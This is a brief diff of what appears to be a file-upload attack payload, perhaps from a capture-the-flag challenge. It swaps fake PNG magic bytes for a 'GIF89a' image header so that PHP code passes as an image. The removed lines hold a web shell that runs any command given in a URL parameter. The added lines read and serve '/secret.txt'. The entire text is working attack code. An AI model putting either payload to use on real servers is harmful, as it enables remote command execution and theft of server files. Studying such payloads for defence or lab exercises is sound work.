@@ -1,5 +1,5 @@
-89 50 4E 47 0D 0A 1A 0A
-
+GIF89a
 <?php
-echo system($_GET['cmd']);
+header("Content-Type: text/plain");
+readfile("/secret.txt");
 ?>
